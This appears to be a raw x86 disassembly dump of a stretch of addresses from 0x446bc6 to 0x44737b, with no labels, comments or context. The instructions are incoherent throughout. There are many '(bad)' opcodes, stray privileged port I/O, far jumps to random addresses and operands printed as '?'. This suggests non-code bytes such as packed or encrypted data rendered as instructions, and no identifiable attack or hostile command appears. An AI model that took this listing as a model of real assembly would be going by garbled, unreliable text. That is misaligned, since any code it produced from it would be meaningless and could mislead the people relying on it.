  446bc6:	or     DWORD PTR [edx-0x1],0x51d4a3bb
  446bcd:	aaa    
  446bce:	aad    0x1
  446bd0:	push   ss
  446bd1:	pop    esp
  446bd2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  446bd3:	aad    0xc5
  446bd5:	push   ss
  446bd6:	lock cwde 
  446bd8:	pop    ecx
  446bd9:	mov    dl,0xca
  446bdb:	pushf  
  446bdc:	jmp    0x7a0cca54
  446be1:	xor    al,0x75
  446be3:	pop    esi
  446be4:	xchg   DWORD PTR [ebx+0x58],edi
  446be7:	pop    es
  446be8:	fs and esp,0xffffffc2
  446bec:	xchg   edi,eax
  446bed:	adc    al,0xcd
  446bef:	cld    
  446bf0:	mov    DWORD PTR [edi+0x59],ebp
  446bf3:	or     DWORD PTR [ebp+0x27],ebp
  446bf6:	neg    ah
  446bf8:	pop    ebp
  446bf9:	add    cl,BYTE PTR [edi+eax*4-0x30]
  446bfd:	push   ebx
  446bfe:	inc    ebx
  446bff:	lds    ebx,FWORD PTR [edx]
  446c01:	or     eax,0x2c39592
  446c06:	and    bh,BYTE PTR [eax-0x18]
  446c09:	lods   eax,DWORD PTR ds:[esi]
  446c0a:	push   0xd00322fc
  446c0f:	inc    eax
  446c10:	or     ch,BYTE PTR [edi+0x19]
  446c13:	or     al,0x60
  446c15:	in     eax,0x60
  446c17:	repz pop DWORD PTR [edx+0x628aed54]
  446c1e:	nop
  446c1f:	lahf   
  446c20:	sbb    al,BYTE PTR ds:0xffb85432
  446c26:	and    eax,0x1e4726aa
  446c2b:	pop    edi
  446c2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  446c2d:	cmp    eax,0xbf44aa41
  446c32:	xlat   BYTE PTR ds:[ebx]
  446c33:	aam    0xca
  446c35:	dec    esp
  446c36:	pop    ds
  446c37:	in     al,dx
  446c38:	jl     0x446c22
  446c3a:	movsx  esi,dh
  446c3d:	lahf   
  446c3e:	xchg   ch,dl
  446c40:	rol    BYTE PTR [ebx+ecx*2-0x79],1
  446c44:	outs   dx,BYTE PTR ds:[esi]
  446c45:	inc    edx
  446c46:	mov    ebp,edx
  446c48:	adc    dh,al
  446c4a:	sub    eax,0x58e1bf04
  446c4f:	in     al,dx
  446c50:	test   al,0xc8
  446c52:	pusha  
  446c53:	jge    0x446c8f
  446c55:	xor    DWORD PTR [edi],0x26f498db
  446c5b:	aam    0xc
  446c5d:	loopne 0x446c5f
  446c5f:	sbb    BYTE PTR [edx-0x75f8cb68],dh
  446c65:	adc    edi,edi
  446c67:	in     eax,0xd2
  446c69:	stc    
  446c6a:	pop    ebp
  446c6b:	(bad)  
  446c6c:	enter  0x6423,0xd5
  446c70:	dec    eax
  446c71:	pop    edi
  446c72:	fdiv   st(2),st
  446c74:	pop    ecx
  446c75:	adc    al,0xbf
  446c77:	jmp    0x2a151802
  446c7c:	pop    esi
  446c7d:	push   ds
  446c7e:	(bad)  
  446c7f:	lahf   
  446c80:	push   ds
  446c81:	pop    ebp
  446c82:	dec    ebp
  446c83:	aad    0xda
  446c85:	dec    esi
  446c86:	pushf  
  446c87:	cwde   
  446c88:	xor    eax,DWORD PTR [eax-0x5c74ffdd]
  446c8e:	dec    ecx
  446c8f:	xor    al,0xca
  446c91:	not    DWORD PTR [esi+ecx*2-0x2a7c80a0]
  446c98:	cs inc esp
  446c9a:	push   0x24d02136
  446c9f:	jle    0x446c2a
  446ca1:	aas    
  446ca2:	xor    eax,0x8e8c47aa
  446ca7:	add    eax,0x521a02f8
  446cac:	repnz leave 
  446cae:	into   
  446caf:	(bad)  
  446cb0:	ss mov ecx,0xa341bd66
  446cb6:	xlat   BYTE PTR ds:[ebx]
  446cb7:	jns    0x446cbb
  446cb9:	adc    BYTE PTR [ecx+0x36],cl
  446cbc:	xor    BYTE PTR [ebx+0x4fcad67b],bh
  446cc2:	cmp    DWORD PTR [ebx],edi
  446cc4:	push   0x25
  446cc6:	inc    eax
  446cc7:	adc    eax,0x9e7e1e85
  446ccc:	mov    BYTE PTR [ebx],dh
  446cce:	fs push esi
  446cd0:	pop    ecx
  446cd1:	sbb    BYTE PTR [edx],bh
  446cd3:	lods   al,BYTE PTR ds:[esi]
  446cd4:	js     0x446d48
  446cd6:	jmp    0x446c77
  446cd8:	rcr    BYTE PTR [esi+0x5],0xd7
  446cdc:	idiv   DWORD PTR [esi]
  446cde:	imul   esp,DWORD PTR [edx+0x6960d85e],0x38
  446ce5:	cmp    DWORD PTR [ecx+eiz*8-0x2bc8e426],esi
  446cec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  446ced:	out    0xef,eax
  446cef:	pop    ecx
  446cf0:	imul   edx,DWORD PTR ds:0xe3886479,0x1b4c7a83
  446cfa:	fisub  WORD PTR [eax+0x3c]
  446cfd:	dec    ecx
  446cfe:	ror    ch,0x35
  446d01:	add    ebx,DWORD PTR [edi+0x5d]
  446d04:	fnstsw WORD PTR [edi+0x2bd2fc00]
  446d0a:	inc    ebp
  446d0b:	les    edi,FWORD PTR [eax+0x3]
  446d0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  446d0f:	inc    ebp
  446d10:	(bad)  
  446d11:	clc    
  446d12:	fs jne 0x446c9f
  446d15:	sbb    al,0x1e
  446d17:	ins    DWORD PTR es:[edi],dx
  446d18:	inc    esi
  446d19:	test   DWORD PTR [edi-0x7d],ebx
  446d1c:	shr    BYTE PTR [ebp-0x6012b03],0x81
  446d23:	jl     0x446cd7
  446d25:	cmp    DWORD PTR [eax+0x12],eax
  446d28:	js     0x446d58
  446d2a:	sub    DWORD PTR [ecx],0x35b63254
  446d30:	push   0xeab4267
  446d35:	or     al,0x5d
  446d37:	xor    esp,eax
  446d39:	add    eax,0x89ec5598
  446d3e:	pop    ds
  446d3f:	cmp    edi,ecx
  446d41:	stos   BYTE PTR es:[edi],al
  446d42:	adc    eax,0x62d8283d
  446d47:	inc    esp
  446d48:	jp     0x446d4d
  446d4a:	cmp    BYTE PTR [edx+ecx*8+0x7b],ch
  446d4e:	sbb    eax,0x1f805ca4
  446d53:	test   ebp,0xf1604e71
  446d59:	jp     0x446d19
  446d5b:	adc    eax,0x6a16a5f5
  446d60:	push   edi
  446d61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  446d62:	sbb    al,0xe9
  446d64:	mov    BYTE PTR ds:0x68febf34,bl
  446d6a:	xor    eax,ebx
  446d6c:	rol    BYTE PTR ds:0xaae763fc,cl
  446d72:	jl     0x446dc6
  446d74:	xchg   esp,eax
  446d75:	and    DWORD PTR [ebx+eax*1+0x49],esp
  446d79:	push   esi
  446d7a:	jge    0x446d8b
  446d7c:	adc    al,0xe1
  446d7e:	and    cl,ah
  446d80:	sbb    DWORD PTR [ebx],esp
  446d82:	retf   0x4468
  446d85:	fstp   st(7)
  446d87:	aam    0x52
  446d89:	or     eax,0xf7e636f
  446d8e:	pusha  
  446d8f:	addr16 push 0x3284dea9
  446d95:	loopne 0x446d56
  446d97:	ror    BYTE PTR [ebx+0x10],cl
  446d9a:	imul   esi,DWORD PTR [ecx*8-0x1bd7b057],0xc5af1f17
  446da5:	outs   dx,DWORD PTR ds:[esi]
  446da6:	arpl   WORD PTR [ecx-0x5064ecfe],si
  446dac:	mov    eax,ds:0x7923a501
  446db1:	adc    DWORD PTR [edx+0x31],0xffffffe3
  446db5:	pop    ds
  446db6:	pop    ds
  446db7:	or     eax,edx
  446db9:	data16 xor al,0x50
  446dbc:	push   eax
  446dbd:	pop    edx
  446dbe:	inc    eax
  446dbf:	aad    0x7d
  446dc1:	adc    eax,0xde18e67f
  446dc6:	fcom   QWORD PTR [ebx+esi*8-0x2161d281]
  446dcd:	sbb    al,0xe1
  446dcf:	adc    bh,0xb3
  446dd2:	adc    eax,0x49676831
  446dd7:	rcl    DWORD PTR [edi-0x39d535d9],0x56
  446dde:	pop    edi
  446ddf:	jne    0x446e49
  446de1:	int    0x75
  446de3:	popf   
  446de4:	mov    bh,0xc9
  446de6:	sub    dh,BYTE PTR [ecx-0x4e]
  446de9:	cmp    BYTE PTR [edi],bl
  446deb:	lods   al,BYTE PTR ds:[esi]
  446dec:	add    al,0x5d
  446dee:	je     0x446e3e
  446df0:	loope  0x446df7
  446df2:	push   eax
  446df3:	or     esi,edi
  446df5:	test   DWORD PTR [edi+0x62bca9d8],edx
  446dfb:	xchg   ebp,eax
  446dfc:	loopne 0x446e48
  446dfe:	dec    esp
  446dff:	arpl   bp,dx
  446e01:	or     eax,DWORD PTR [eax]
  446e03:	xor    BYTE PTR [esi],0x3
  446e06:	inc    esp
  446e07:	outs   dx,DWORD PTR ds:[esi]
  446e09:	add    eax,ebx
  446e0b:	push   ss
  446e0c:	cmc    
  446e0d:	push   edi
  446e0e:	daa    
  446e0f:	ret    
  446e10:	mov    ecx,edx
  446e12:	pop    esi
  446e13:	and    eax,0xf9d604ef
  446e18:	cmp    eax,DWORD PTR [edx]
  446e1a:	(bad)  
  446e1b:	repz jns 0x446db4
  446e1e:	repz inc edi
  446e20:	aad    0xb2
  446e22:	pop    ds
  446e23:	aas    
  446e24:	push   esi
  446e25:	add    al,cl
  446e27:	cdq    
  446e28:	and    BYTE PTR [edi-0x1fd22948],dl
  446e2e:	leave  
  446e2f:	xor    al,0x34
  446e31:	cld    
  446e32:	and    eax,0x60dea1ff
  446e37:	fld    QWORD PTR [ebp+ebx*8-0x58a9a3d4]
  446e3e:	jmp    0x446e14
  446e40:	jmp    esi
  446e42:	dec    esi
  446e43:	cwde   
  446e44:	xchg   ebx,eax
  446e45:	repnz fs xchg ebp,eax
  446e48:	mov    ebp,ecx
  446e4a:	mov    bl,BYTE PTR [edx+0x22]
  446e4d:	out    dx,eax
  446e4e:	jnp    0x446e54
  446e50:	into   
  446e51:	add    eax,0x8a046b32
  446e56:	mov    ds:0xff30d31b,al
  446e5b:	(bad)  
  446e5c:	dec    esp
  446e5d:	jg     0x446e7d
  446e5f:	jmp    0x58652fa7
  446e64:	sub    DWORD PTR [edx],0x17efb5c3
  446e6a:	mov    cs,WORD PTR [edi+ebx*4-0x1e0a8e85]
  446e71:	mov    WORD PTR [edx+eiz*8-0x452c1c78],?
  446e78:	push   ds
  446e79:	xor    DWORD PTR [ebp+ebp*2+0x15],ecx
  446e7d:	sbb    dh,BYTE PTR es:[esi]
  446e80:	call   0x2d75:0x1d41e82
  446e87:	bts    DWORD PTR [edi+ebx*1+0x5ee2da5],ebx
  446e8f:	in     al,0x56
  446e91:	push   ecx
  446e92:	(bad)  
  446e93:	aad    0xf7
  446e95:	xchg   edi,eax
  446e96:	test   al,0x8c
  446e98:	sqrtps xmm6,xmm3
  446e9b:	bound  esp,QWORD PTR [esi-0x764807ed]
  446ea1:	and    ebx,DWORD PTR [ecx+0x4e]
  446ea4:	push   ds
  446ea5:	shl    BYTE PTR [ecx-0x651bbb2c],cl
  446eab:	into   
  446eac:	add    al,0xb5
  446eae:	mov    ecx,DWORD PTR [edx+0x398f7188]
  446eb4:	loope  0x446ea9
  446eb6:	cmc    
  446eb7:	sbb    al,0x48
  446eb9:	add    dl,BYTE PTR [esi-0x13d1e997]
  446ebf:	cmp    al,0x3d
  446ec1:	frstor [eax-0x55]
  446ec4:	and    esp,esp
  446ec6:	outs   dx,BYTE PTR gs:[esi]
  446ec8:	js     0x446ece
  446eca:	mov    ecx,0xb2b74bd5
  446ecf:	inc    ebx
  446ed0:	enter  0x4e93,0x33
  446ed4:	mov    DWORD PTR [ebx+0x23],esp
  446ed7:	retf   0xa24e
  446eda:	lods   eax,DWORD PTR ds:[esi]
  446edb:	inc    eax
  446edc:	mov    bh,0xf7
  446ede:	sar    BYTE PTR [esi-0x80],1
  446ee1:	add    cl,BYTE PTR [edi+eiz*1]
  446ee4:	sub    al,0x8a
  446ee6:	lds    edx,FWORD PTR [ebx]
  446ee8:	adc    cl,BYTE PTR [edi]
  446eea:	pop    eax
  446eeb:	adc    edi,edi
  446eed:	push   ebp
  446eee:	(bad)  
  446eef:	in     eax,dx
  446ef0:	add    esp,DWORD PTR [si-0xe]
  446ef4:	bound  edi,QWORD PTR [edi+0x4a]
  446ef7:	pop    edi
  446ef8:	add    BYTE PTR [esi],ah
  446efa:	jle    0x446f4f
  446efc:	and    bl,al
  446efe:	loopne 0x446f7c
  446f00:	xor    al,0xac
  446f02:	push   ds
  446f03:	hlt    
  446f04:	mov    bh,ah
  446f06:	int    0x71
  446f08:	imul   edi,edx,0x2e059e5
  446f0e:	enter  0xd60,0x2a
  446f12:	mov    al,0x31
  446f14:	dec    esp
  446f15:	dec    ecx
  446f16:	cdq    
  446f17:	popf   
  446f18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  446f19:	adc    al,0xcf
  446f1b:	pop    esp
  446f1c:	scas   eax,DWORD PTR es:[edi]
  446f1d:	adc    BYTE PTR [esi+0x6b],bl
  446f20:	dec    eax
  446f21:	fsub   QWORD PTR [eax+0x289fe0d4]
  446f27:	xchg   ebx,eax
  446f28:	ins    DWORD PTR es:[edi],dx
  446f29:	mov    gs,WORD PTR [edi+0x13]
  446f2c:	pop    ebp
  446f2d:	pop    ss
  446f2e:	push   ds
  446f2f:	xchg   edi,eax
  446f30:	enter  0xb207,0xf3
  446f34:	xor    al,0x8a
  446f36:	mov    ebx,0x5f12bad5
  446f3b:	hlt    
  446f3c:	clc    
  446f3d:	pop    ebx
  446f3e:	dec    ebp
  446f3f:	mov    ebp,0x9b0f18e
  446f44:	jl     0x446f90
  446f46:	sbb    eax,0xf5bf1a07
  446f4b:	aad    0x80
  446f4d:	int    0x43
  446f4f:	sbb    edi,DWORD PTR [edi+0x72]
  446f52:	inc    esp
  446f53:	sub    BYTE PTR [ebx+0x786837fb],cl
  446f59:	mov    edx,0x2b5835a2
  446f5e:	data16 aad 0x2d
  446f61:	mov    ds:0x54c9bbdf,eax
  446f66:	pop    esp
  446f67:	int3   
  446f68:	jne    0x446f78
  446f6a:	pop    ds
  446f6b:	rol    eax,cl
  446f6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  446f6e:	jp     0x446f3e
  446f70:	int3   
  446f71:	push   cs
  446f72:	aam    0xf1
  446f74:	jbe    0x446f8a
  446f76:	mov    WORD PTR [ebx-0x53],es
  446f79:	in     al,0x18
  446f7b:	xor    al,0xca
  446f7d:	sub    al,0x7e
  446f7f:	pop    ecx
  446f80:	call   0x755fe18b
  446f85:	call   0x245e43d7
  446f8a:	pop    esp
  446f8b:	inc    edi
  446f8c:	adc    edx,esp
  446f8e:	test   BYTE PTR [esi-0x2e],bl
  446f91:	rcr    DWORD PTR [edi],0xaa
  446f94:	bound  ebp,QWORD PTR [edx]
  446f96:	push   0xce6daf45
  446f9b:	pop    ss
  446f9c:	pop    esp
  446f9d:	add    ebx,DWORD PTR [ebx+ecx*2]
  446fa0:	cmp    eax,edx
  446fa2:	test   eax,0xdc24bfed
  446fa7:	mov    esi,edi
  446fa9:	or     BYTE PTR [ebx-0x33fd2bcd],dh
  446faf:	in     eax,dx
  446fb0:	or     al,0xa
  446fb2:	add    BYTE PTR [ecx],al
  446fb4:	mov    DWORD PTR [ebp+0xc4d2350],ebp
  446fba:	pop    ds
  446fbb:	inc    edx
  446fbc:	hlt    
  446fbd:	add    eax,0x680efc6c
  446fc2:	sahf   
  446fc3:	and    al,0x41
  446fc5:	push   eax
  446fc6:	jge    0x446f8f
  446fc8:	fdivr  QWORD PTR [ecx-0x3e]
  446fcb:	xchg   edi,eax
  446fcc:	xor    al,0x6b
  446fce:	mov    sp,0x7b30
  446fd2:	jnp    0x446fa8
  446fd4:	ja     0x446fda
  446fd6:	pushf  
  446fd7:	mov    dh,0x2
  446fd9:	mov    dl,0xf6
  446fdb:	ja     0x446f6a
  446fdd:	cmovle eax,DWORD PTR [ecx+0x57224c2a]
  446fe4:	es push ds
  446fe6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  446fe7:	rcr    DWORD PTR [esi+ecx*8-0x80],cl
  446feb:	std    
  446fec:	dec    ebx
  446fed:	int3   
  446fee:	lock and dl,BYTE PTR [ebp-0xb]
  446ff2:	jle    0x446f87
  446ff4:	ds cwde 
  446ff6:	mov    WORD PTR ds:0x354af868,ss
  446ffc:	inc    edi
  446ffd:	cld    
  446ffe:	jno    0x44705c
  447000:	xchg   edx,eax
  447001:	inc    edx
  447002:	pop    ds
  447003:	or     al,0xfc
  447005:	lods   al,BYTE PTR ds:[esi]
  447006:	retf   0x9bee
  447009:	dec    ebx
  44700a:	fs sbb eax,0x3178d1ab
  447010:	or     al,0xf3
  447012:	xchg   esp,eax
  447013:	icebp  
  447014:	add    DWORD PTR ds:0x4c90d38c,0xffffff94
  44701b:	out    dx,eax
  44701c:	and    BYTE PTR [eax],dl
  44701e:	add    edx,ebp
  447020:	jno    0x446ff7
  447022:	jbe    0x446fab
  447024:	fistp  WORD PTR [ebp+0x75fdd61f]
  44702a:	push   edx
  44702b:	(bad)  
  44702c:	jo     0x44701b
  44702e:	xchg   ch,dl
  447030:	add    DWORD PTR [ebp+0x1b109bda],edx
  447036:	les    ebp,FWORD PTR [esi]
  447038:	lahf   
  447039:	pop    es
  44703a:	adc    al,0xeb
  44703c:	test   BYTE PTR ds:0xbde05a74,0x59
  447043:	(bad)  
  447044:	adc    dl,BYTE PTR [edi+0x37de50eb]
  44704a:	sbb    ecx,ebp
  44704c:	fstp   DWORD PTR [edi+esi*8-0x5a]
  447050:	mov    DWORD PTR [ecx],eax
  447052:	dec    ecx
  447053:	pushf  
  447054:	push   esp
  447055:	sub    DWORD PTR [esi+0x67],0xc88a02d2
  44705c:	and    DWORD PTR [ebp-0x6500b12a],ebp
  447062:	pop    ds
  447063:	and    DWORD PTR [eax-0x1f],esp
  447066:	xor    eax,0xa1a232e5
  44706b:	aam    0x3c
  44706d:	push   ss
  44706e:	jmp    0x93649bc9
  447073:	sub    DWORD PTR [ebp+ecx*8+0x435e933d],edx
  44707a:	mov    edi,0x144ae9c
  44707f:	stos   BYTE PTR es:[edi],al
  447080:	dec    esp
  447081:	test   eax,0x814ebfc0
  447086:	mov    cs,WORD PTR [eax]
  447088:	mov    ebx,0x86505c85
  44708d:	xchg   ecx,esi
  44708f:	sbb    eax,0xbbebb9cb
  447094:	fnstcw WORD PTR [edx]
  447096:	jmp    0xf839:0x9e8b0fc2
  44709d:	inc    esi
  44709e:	push   ds
  44709f:	cmp    ecx,DWORD PTR [edi]
  4470a1:	and    al,al
  4470a3:	mov    edx,0xd960d3b9
  4470a8:	lds    ebx,FWORD PTR [ebx+0x90ecd5e]
  4470ae:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  4470b0:	fwait
  4470b1:	out    0xb7,al
  4470b3:	stos   DWORD PTR es:[edi],eax
  4470b4:	inc    eax
  4470b5:	and    ebp,ebx
  4470b7:	xchg   edi,eax
  4470b8:	fwait
  4470b9:	mov    edi,0x35552191
  4470be:	or     edi,eax
  4470c0:	jge    0x4470c5
  4470c2:	fs mov bl,0x76
  4470c5:	or     DWORD PTR [eax-0xed47671],edx
  4470cb:	pop    ebx
  4470cc:	pop    esp
  4470cd:	sbb    ah,BYTE PTR [edi-0x43]
  4470d0:	(bad)  
  4470d2:	xor    BYTE PTR [ebx],ch
  4470d4:	aas    
  4470d5:	aas    
  4470d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4470d7:	cmp    al,0x9d
  4470d9:	in     al,0xe9
  4470db:	aam    0x9e
  4470dd:	outs   dx,BYTE PTR ds:[esi]
  4470de:	mov    ecx,0x809188dc
  4470e3:	dec    ecx
  4470e4:	sbb    BYTE PTR [edi+0x53],dl
  4470e7:	jl     0x447152
  4470e9:	add    ebx,DWORD PTR [eax-0x43]
  4470ec:	xor    edi,0x5d
  4470ef:	ret    
  4470f0:	inc    edi
  4470f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4470f2:	pop    ds
  4470f3:	out    dx,eax
  4470f4:	mov    WORD PTR [ebx+0x3a00e577],ss
  4470fa:	sbb    eax,0xc34149b9
  4470ff:	das    
  447100:	mov    eax,0xb178a662
  447105:	sbb    DWORD PTR [eax-0x5d],0xffffff88
  447109:	mov    ah,0xac
  44710b:	pop    eax
  44710c:	inc    eax
  44710d:	xor    eax,0xe396d5b1
  447112:	mov    bh,0x16
  447114:	cmp    dh,BYTE PTR [ebp-0x20]
  447117:	sub    ebx,DWORD PTR [ebx-0x20aafe05]
  44711d:	les    esp,FWORD PTR [eax+0x1c]
  447120:	cwde   
  447121:	lds    ecx,FWORD PTR [ecx+0x17418e47]
  447127:	cs push ebx
  447129:	pop    es
  44712a:	xchg   ah,dl
  44712c:	xor    cl,BYTE PTR [edx]
  44712e:	cwde   
  44712f:	aam    0x11
  447131:	jbe    0x447136
  447133:	sbb    ah,BYTE PTR ds:0x28ecaa41
  447139:	mov    esi,0xd98e88f9
  44713e:	mov    edi,0xc9dcd927
  447143:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  447144:	push   eax
  447145:	xchg   BYTE PTR [edi],ch
  447147:	aam    0xa7
  447149:	jae    0x4470d3
  44714b:	das    
  44714c:	js     0x4471c1
  44714e:	leave  
  44714f:	pop    ecx
  447150:	mov    DWORD PTR [ebx],eax
  447152:	cmp    al,0x85
  447154:	jne    0x447154
  447156:	js     0x4470fd
  447158:	in     eax,dx
  447159:	pop    ds
  44715a:	adc    dl,BYTE PTR [ebx-0x64b0523d]
  447160:	das    
  447161:	ja     0x4471c2
  447163:	ret    0x75f6
  447166:	push   ds
  447167:	add    esi,DWORD PTR [esi+ecx*2]
  44716a:	xchg   al,bh
  44716c:	pop    edx
  44716d:	jmp    0x44719d
  44716f:	mov    edx,0x320e24a9
  447174:	(bad)  
  447175:	xchg   ecx,eax
  447176:	or     BYTE PTR [edi],dh
  447178:	fsubr  DWORD PTR [edx-0x3e]
  44717b:	in     eax,0x88
  44717d:	pop    es
  44717e:	je     0x44715f
  447180:	stos   DWORD PTR es:[edi],eax
  447181:	in     al,dx
  447182:	jmp    0x4471ed
  447184:	mov    ah,0x5
  447186:	xor    al,0x4f
  447188:	mov    bl,0xe0
  44718a:	dec    esi
  44718b:	(bad)
  44718f:	mov    BYTE PTR [eax-0x7c4a4439],cl
  447195:	pusha  
  447196:	popf   
  447197:	jmp    0x6533:0x6d761cd5
  44719e:	dec    edi
  44719f:	mov    bh,0x4f
  4471a1:	lahf   
  4471a2:	xchg   esi,eax
  4471a3:	retf   0x1349
  4471a6:	lahf   
  4471a7:	in     eax,0xd1
  4471a9:	jae    0x4471f0
  4471ab:	jno    0x44713a
  4471ad:	in     eax,dx
  4471ae:	mov    DWORD PTR [eax],esp
  4471b0:	aad    0x83
  4471b2:	sti    
  4471b3:	aaa    
  4471b4:	sub    BYTE PTR ds:0x10daa749,bl
  4471ba:	xor    al,0xbc
  4471bc:	mov    bh,al
  4471be:	ror    ecx,cl
  4471c0:	jmp    0xce15cc90
  4471c5:	fldz   
  4471c7:	pop    ebp
  4471c8:	sbb    BYTE PTR [edx-0x6834e49f],al
  4471ce:	test   DWORD PTR [eax+0x25],0x45b41003
  4471d5:	mov    BYTE PTR [ecx-0x2f],ah
  4471d8:	imul   ebp,DWORD PTR [eax+0x1f],0x5d17cc29
  4471df:	inc    ebp
  4471e0:	les    edi,FWORD PTR [ecx-0x14]
  4471e3:	aam    0xb5
  4471e5:	adc    DWORD PTR [esp+0x50],ebx
  4471e9:	mov    DWORD PTR [ecx+0x5ce67a24],ecx
  4471ef:	pop    ecx
  4471f0:	pop    ebx
  4471f1:	(bad)  
  4471f2:	(bad)  
  4471f3:	sti    
  4471f4:	dec    esi
  4471f5:	iret   
  4471f6:	inc    esp
  4471f7:	cmp    DWORD PTR [eax+0x75],eax
  4471fa:	dec    edi
  4471fb:	shr    ebp,cl
  4471fd:	jbe    0x447271
  4471ff:	mov    ah,0x77
  447201:	mov    bh,0x4f
  447203:	cmp    al,0x56
  447205:	pop    ebx
  447206:	jp     0x447287
  447208:	std    
  447209:	and    esi,DWORD PTR [edx]
  44720b:	adc    al,0xde
  44720d:	pop    ebx
  44720e:	clc    
  44720f:	fwait
  447210:	add    eax,0xd1cb2014
  447215:	mul    BYTE PTR [edx]
  447217:	inc    edx
  447218:	mov    ebx,edi
  44721a:	jp     0x447264
  44721c:	ja     0x447211
  44721e:	mov    fs,WORD PTR [edx+0x32d14f88]
  447224:	pop    ecx
  447225:	mov    ch,0x96
  447227:	sub    ah,bl
  447229:	adc    eax,esi
  44722b:	std    
  44722c:	xchg   edi,eax
  44722d:	pop    esi
  44722e:	popa   
  44722f:	stos   DWORD PTR es:[edi],eax
  447230:	xor    al,0xe1
  447232:	les    eax,FWORD PTR [eax]
  447234:	dec    eax
  447235:	pop    eax
  447236:	mov    ah,0x65
  447238:	popa   
  447239:	jns    0x4471fa
  44723b:	(bad)  
  44723c:	mov    DWORD PTR [ecx],ebp
  44723e:	inc    edx
  44723f:	xor    dl,BYTE PTR [esi+0x73]
  447242:	jae    0x4471de
  447244:	and    DWORD PTR [edx],eax
  447246:	(bad)  
  447248:	cmp    DWORD PTR [eax+ecx*1+0x677401ce],ebx
  44724f:	adc    eax,0x7b4401d0
  447254:	lea    esi,[esi+edi*1+0x14]
  447258:	sar    cl,cl
  44725a:	mov    al,0xd5
  44725c:	mov    esi,0x48196196
  447261:	mov    ecx,ss
  447263:	inc    esp
  447264:	mov    BYTE PTR [ebp+0x1d],ah
  447267:	add    eax,0xec30964d
  44726c:	jg     0x44726f
  44726e:	push   cs
  44726f:	jge    0x447208
  447271:	fist   WORD PTR [ebx-0x7a7d8da6]
  447277:	inc    esi
  447278:	(bad)  
  447279:	mov    DWORD PTR [ebx-0x29],ecx
  44727c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44727d:	adc    BYTE PTR [esi],bl
  44727f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  447280:	dec    esi
  447281:	mov    DWORD PTR [edi-0x1be0251c],ebp
  447287:	mov    ?,WORD PTR [ebp-0x7c]
  44728a:	std    
  44728b:	fmulp  st(1),st
  44728d:	mov    dl,0xf
  44728f:	int    0x89
  447291:	and    eax,0x8cb6ebde
  447296:	mov    cl,0x39
  447298:	mov    eax,ds:0x55a65805
  44729d:	loope  0x447306
  44729f:	or     eax,DWORD PTR [esi+0x129b1f09]
  4472a5:	gs pushf 
  4472a7:	push   es
  4472a8:	cmp    al,0xf0
  4472aa:	xor    dl,dl
  4472ac:	sbb    al,0x78
  4472ae:	stos   BYTE PTR es:[edi],al
  4472af:	xlat   BYTE PTR ds:[ebx]
  4472b0:	outs   dx,DWORD PTR ds:[esi]
  4472b1:	fcmove st,st(7)
  4472b3:	xchg   edx,eax
  4472b4:	mov    eax,ds:0x3c271f25
  4472b9:	imul   ebp,DWORD PTR [ecx],0xd02b9150
  4472bf:	pop    edx
  4472c0:	mov    ds:0x400466e7,al
  4472c5:	out    0x1,eax
  4472c7:	jo     0x447341
  4472c9:	jno    0x4472c8
  4472cb:	outs   dx,BYTE PTR ds:[esi]
  4472cc:	mov    DWORD PTR [ebx-0x3b16f204],ecx
  4472d2:	adc    ecx,DWORD PTR ds:0xa0c034b
  4472d8:	lahf   
  4472d9:	pop    es
  4472da:	cmp    BYTE PTR [ecx+ecx*2+0x686bb7e9],bh
  4472e1:	or     ebx,DWORD PTR [ebp-0x7b]
  4472e4:	unpcklps xmm1,xmm2
  4472e7:	sub    edi,DWORD PTR [edx+edx*8-0x6c]
  4472eb:	int    0xce
  4472ed:	sbb    al,0x2a
  4472ef:	(bad)  
  4472f1:	and    al,0x5
  4472f3:	mov    eax,ds:0xec911f0f
  4472f8:	cli    
  4472f9:	int    0x42
  4472fb:	xchg   esi,eax
  4472fc:	(bad)  
  4472fd:	imul   eax,edx,0xffffff81
  447300:	jecxz  0x447372
  447302:	(bad)  
  447303:	mov    ch,0x7e
  447305:	jl     0x4472b8
  447307:	mov    eax,0x9561d7bb
  44730c:	enter  0xa51e,0x74
  447310:	inc    edx
  447311:	mov    eax,ds:0xa597296a
  447316:	xchg   esp,eax
  447317:	loop   0x447322
  447319:	jg     0x4472b2
  44731b:	call   0xd4853ddf
  447320:	outs   dx,DWORD PTR ds:[esi]
  447321:	mul    BYTE PTR [ebp+0x11]
  447324:	cld    
  447325:	pop    ds
  447326:	jge    0x4472f9
  447328:	and    eax,0x8c56ed9b
  44732d:	aam    0x19
  44732f:	push   eax
  447330:	sub    cl,cl
  447332:	(bad)  
  447333:	aad    0xa4
  447335:	aas    
  447336:	inc    esp
  447337:	outs   dx,BYTE PTR ds:[esi]
  447338:	retf   
  447339:	xor    ebx,DWORD PTR [esi-0x6a7276f0]
  44733f:	dec    eax
  447340:	mov    esi,0x7a90aece
  447345:	add    edi,DWORD PTR [esp+ecx*2+0x21]
  447349:	(bad)  
  44734a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44734b:	pop    es
  44734c:	push   esp
  44734d:	(bad)  
  44734e:	pusha  
  44734f:	popa   
  447350:	xor    BYTE PTR [eax-0x27],bl
  447353:	leave  
  447354:	loop   0x447391
  447356:	or     ch,BYTE PTR [edx+0x78f2ebff]
  44735c:	mov    ah,0x7c
  44735e:	jle    0x447304
  447360:	pop    eax
  447361:	jno    0x447378
  447363:	sub    DWORD PTR [eax+0x2490d18d],ecx
  447369:	fs push eax
  44736b:	jbe    0x4472f9
  44736d:	add    ebp,DWORD PTR [esi-0x20]
  447370:	adc    edi,eax
  447372:	and    dl,dl
  447374:	arpl   dx,sp
  447376:	sub    al,0x19
  447378:	mov    BYTE PTR [ebp-0x65],dh
  44737b:	fistp  QWORD PTR [ebp-0x28f55292]
